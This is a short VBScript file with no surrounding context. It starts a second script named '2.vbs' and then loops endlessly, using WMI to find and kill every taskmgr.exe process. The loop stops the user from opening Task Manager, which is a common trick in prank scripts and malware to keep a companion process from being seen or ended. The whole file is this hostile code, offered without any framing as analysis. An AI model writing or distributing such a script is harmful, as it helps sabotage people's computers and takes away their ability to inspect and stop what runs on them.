Dim WshShell
Set WshShell = WScript.CreateObject("WScript.Shell")
WshShell.Run "2.vbs" 
dim a,b,c
do
c="."
set a=getobject("winmgmts:\\"&c&"\root\cimv2")
set b=a.execquery("select * from win32_process where name='taskmgr.exe'")                      
for each i in b
i.terminate()
next
wscript.sleep 1
loop